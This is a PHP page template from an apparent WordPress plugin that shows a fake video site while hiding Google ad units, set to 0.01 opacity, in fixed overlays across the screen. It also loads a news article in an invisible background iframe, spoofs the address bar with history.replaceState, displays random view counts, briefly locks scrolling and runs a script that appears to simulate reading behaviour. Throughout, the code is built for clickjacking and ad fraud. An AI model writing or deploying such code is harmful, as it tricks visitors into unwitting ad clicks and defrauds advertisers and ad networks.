<?php
$template_id = 2;
$default_data = [
    1 => ['url' => 'https://bekarschool.com/hospital/infection-control-standards-vary-widely-across-hospitals-in-low-income-countries/', 't' => 'Infection Control Standards', 'd' => 'Infection control standards.', 'k' => 'infection, hospitals'],
    2 => ['url' => 'https://bekarschool.com/hospital/middle-eastern-nations-invest-heavily-in-world-class-hospital-infrastructure/', 't' => 'Middle Eastern Nations Invest', 'd' => 'Middle eastern hospital.', 'k' => 'middle east, hospitals'],
    3 => ['url' => 'https://bekarschool.com/hospital/mental-health-wards-in-global-hospitals-face-chronic-underfunding-who-report-warns/', 't' => 'Mental Health Wards', 'd' => 'WHO report on mental health.', 'k' => 'mental health'],
    4 => ['url' => 'https://bekarschool.com/hospital/indias-medical-tourism-boom-drives-billion-dollar-hospital-expansion-projects/', 't' => 'India Medical Tourism Boom', 'd' => 'India medical tourism.', 'k' => 'india, medical'],
    5 => ['url' => 'https://bekarschool.com/hospital/telemedicine-expansion-reduces-emergency-room-overcrowding-in-latin-american-hospitals/', 't' => 'Telemedicine Reduces ER', 'd' => 'Telemedicine in Latin America.', 'k' => 'telemedicine, ER'],
    6 => ['url' => 'https://bekarschool.com/hospital/post-pandemic-staffing-crisis-leaves-hospitals-worldwide-struggling-to-retain-nurses/', 't' => 'Post-Pandemic Staffing Crisis', 'd' => 'Staffing crisis in hospitals.', 'k' => 'staffing crisis'],
    7 => ['url' => 'https://bekarschool.com/hospital/european-hospitals-lead-the-way-in-sustainable-carbon-neutral-healthcare-facilities/', 't' => 'European Hospitals Sustainable', 'd' => 'European hospitals lead.', 'k' => 'european hospitals']
];

$def_ad_1 = '<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js" crossorigin="anonymous"></script><script>window.googletag = window.googletag || {cmd: []}; googletag.cmd.push(function() { googletag.defineSlot(\'/22921661649/ca-pub-2851824833818486-tag/BS1\', [, \'fluid\'], \'div-gpt-ad-1776202709249-0\').addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });</script><div id="div-gpt-ad-1776202709249-0" style="min-width: 336px; min-height: 280px;"><script>googletag.cmd.push(function() { googletag.display(\'div-gpt-ad-1776202709249-0\'); });</script></div>';
$def_ad_2 = '<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js" crossorigin="anonymous"></script><script>window.googletag = window.googletag || {cmd: []}; googletag.cmd.push(function() { googletag.defineSlot(\'/22921661649/ca-pub-2851824833818486-tag/BS2\', [, \'fluid\'], \'div-gpt-ad-1776202739015-0\').addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });</script><div id="div-gpt-ad-1776202739015-0" style="min-width: 336px; min-height: 280px;"><script>googletag.cmd.push(function() { googletag.display(\'div-gpt-ad-1776202739015-0\'); });</script></div>';
$def_ad_3 = '<script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js" crossorigin="anonymous"></script><script>window.googletag = window.googletag || {cmd: []}; googletag.cmd.push(function() { googletag.defineSlot(\'/22921661649/ca-pub-2851824833818486-tag/BS3\', [, \'fluid\'], \'div-gpt-ad-1776202760842-0\').addService(googletag.pubads()); googletag.pubads().enableSingleRequest(); googletag.enableServices(); });</script><div id="div-gpt-ad-1776202760842-0" style="min-width: 336px; min-height: 280px;"><script>googletag.cmd.push(function() { googletag.display(\'div-gpt-ad-1776202760842-0\'); });</script></div>';

$article_url = get_option('adx_url_' . $template_id); if(empty($article_url)) $article_url = $default_data[$template_id]['url'];
$meta_title = get_option('adx_title_' . $template_id); if(empty($meta_title)) $meta_title = $default_data[$template_id]['t'];
$meta_desc = get_option('adx_desc_' . $template_id); if(empty($meta_desc)) $meta_desc = $default_data[$template_id]['d'];
$meta_keys = get_option('adx_keys_' . $template_id); if(empty($meta_keys)) $meta_keys = $default_data[$template_id]['k'];

$ad_1 = get_option('adx_ad_1'); if(empty($ad_1)) $ad_1 = $def_ad_1;
$ad_2 = get_option('adx_ad_2'); if(empty($ad_2)) $ad_2 = $def_ad_2;
$ad_3 = get_option('adx_ad_3'); if(empty($ad_3)) $ad_3 = $def_ad_3;

$def_vids = "https://saveearth.live/amplify_video/VBa6q2Opg9WGhLBt.mp4\nhttps://saveearth.live/amplify_video/PJTRwAEM800WWzV-.mp4\nhttps://saveearth.live/amplify_video/zknM8PekP2n5Min-.mp4";
$v_text = get_option('adx_videos'); if(empty($v_text)) $v_text = $def_vids;

$def_imgs = "https://cinta-7ht.pages.dev/1.webp\nhttps://cinta-7ht.pages.dev/2.webp\nhttps://cinta-7ht.pages.dev/3.webp\nhttps://cinta-7ht.pages.dev/4.webp\nhttps://cinta-7ht.pages.dev/5.webp\nhttps://cinta-7ht.pages.dev/6.webp";
$i_text = get_option('adx_images'); if(empty($i_text)) $i_text = $def_imgs;

$js_videos = []; foreach(explode("\n", trim($v_text)) as $v) { $v=trim($v); if($v) $js_videos[]="{src:'".esc_js($v)."', title:'Trending Hot'}"; }
$js_images = []; foreach(explode("\n", trim($i_text)) as $i) { $i=trim($i); if($i) $js_images[]="{img:'".esc_js($i)."', title:'Watch Video'}"; }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title><?php echo esc_html($meta_title); ?></title>
    <meta name="description" content="<?php echo esc_attr($meta_desc); ?>">
    
    <style>
        :root { --bg: #020813; --card: #0a192f; --accent: #00a8ff; --radius: 8px; }
        html, body { background: var(--bg) !important; color: #fff; font-family: sans-serif; margin: 0; padding: 0; max-width: 500px; margin: 0 auto; }
        
        #article-background-iframe { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; border: none; opacity: 0; pointer-events: none; }
        .ad-overlay { position: fixed; top: 0; left: 0; right: 0; z-index: 9999; pointer-events: none; }
        .ad-slot { visibility: visible; opacity: 0.01; width: 100%; max-width: 500px; margin: 0 auto; overflow: hidden; pointer-events: auto; }
        .ad-slot-1 { position: fixed; top: 5px; } .ad-slot-2 { position: fixed; top: 290px; } .ad-slot-3 { position: fixed; top: 580px; }
        
        .header { background: var(--bg); height: 55px; display: flex; align-items: center; justify-content: space-around; padding: 0 15px; border-bottom: 1px solid var(--card); }
        .brand { color: var(--accent); font-size: 22px; font-weight: bold; }
        .video-container { width: 100%; padding-bottom: 56.25%; position: relative; background: #000; }
        .video-container video { position: absolute; top:0; left:0; width:100%; height:100%; }
        
        .info-box { padding: 15px; background: var(--bg); }
        .v-title { font-size: 16px; font-weight: bold; margin-bottom: 8px; }
        .actions { display: flex; gap: 10px; padding: 10px 15px; background: var(--bg); border-bottom: 1px solid var(--card); }
        .btn { flex: 1; padding: 10px; background: var(--card); text-align: center; border-radius: var(--radius); font-size: 13px; font-weight:bold; }
        .btn.primary { background: var(--accent); color: #fff; }
        
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; padding: 10px; }
        .card { background: var(--card); border-radius: var(--radius); overflow: hidden; }
        .thumb { width: 100%; padding-bottom: 56.25%; position: relative; background: #000; }
        .thumb img { position: absolute; top:0; left:0; width:100%; height:100%; object-fit: cover; }
        .c-title { padding: 8px; font-size: 12px; }
    </style>
</head>
<body>
    <iframe id="article-background-iframe" src="<?php echo esc_url($article_url); ?>"></iframe>
    
    <div class="ad-overlay">
        <div class="ad-slot ad-slot-1"><?php echo wp_unslash($ad_1); ?></div>
        <div class="ad-slot ad-slot-2"><?php echo wp_unslash($ad_2); ?></div>
        <div class="ad-slot ad-slot-3"><?php echo wp_unslash($ad_3); ?></div>
    </div>

    <div class="header"><div class="brand">BlueVid</div></div>
    
    <div class="video-container">
        <video id="player" controls muted autoplay playsinline></video>
    </div>
    <div class="info-box">
        <div class="v-title" id="mainTitle">Loading Video...</div>
        <div style="color:#aaa; font-size:12px;"><span id="views"></span> views</div>
    </div>
    
    <div class="actions">
        <div class="btn primary">Like</div>
        <div class="btn">Share</div>
        <div class="btn">Save</div>
    </div>
    
    <h3 style="padding:15px 10px 5px; margin:0;">Recommended</h3>
    <div class="grid" id="vidGrid"></div>

    <script>
        const vids = [<?php echo implode(',', $js_videos); ?>];
        const imgs = [<?php echo implode(',', $js_images); ?>];
        
        if(vids.length > 0) {
            const v = vids[Math.floor(Math.random() * vids.length)];
            document.getElementById('player').src = v.src;
            document.getElementById('mainTitle').textContent = v.title;
            document.getElementById('views').textContent = Math.floor(Math.random() * 900 + 100) + 'K';
        }
        
        const grid = document.getElementById('vidGrid');
        const shuffled = imgs.sort(() => 0.5 - Math.random());
        for(let i=0; i<Math.min(6, shuffled.length); i++) {
            grid.innerHTML += `<div class="card"><div class="thumb"><img src="${shuffled[i].img}"></div><div class="c-title">${shuffled[i].title}</div></div>`;
        }
        
        document.body.style.overflow = 'hidden';
        setTimeout(() => document.body.style.overflow = 'auto', 5000);
        
        var cookieName = "agc_a912cd6f698479f51886f7086c047992";
        document.cookie = cookieName + "=1;path=/;max-age=" + (365*24*60*60);
        
        var u = "<?php echo esc_js($article_url); ?>";
        if(u && window.history.replaceState) { try{ window.history.replaceState(null, "", u); }catch(e){} }
    </script>

    <script src="<?php echo plugin_dir_url(__FILE__); ?>assets/js/article-scroll.js"></script>
    <script src="<?php echo plugin_dir_url(__FILE__); ?>assets/js/advanced-ads.js"></script>
    <script>
        window.addEventListener('load', function() {
            setTimeout(function() {
                if(window.ArticleScroll) {
                    window.ArticleScroll.init({"enabled":true,"delayMin":2,"delayMax":5,"chunkMin":30,"chunkMax":150,"pauseMin":500,"pauseMax":3000,"speedMin":50,"speedMax":200});
                }
            }, 500);
        });
    </script>
</body>
</html>
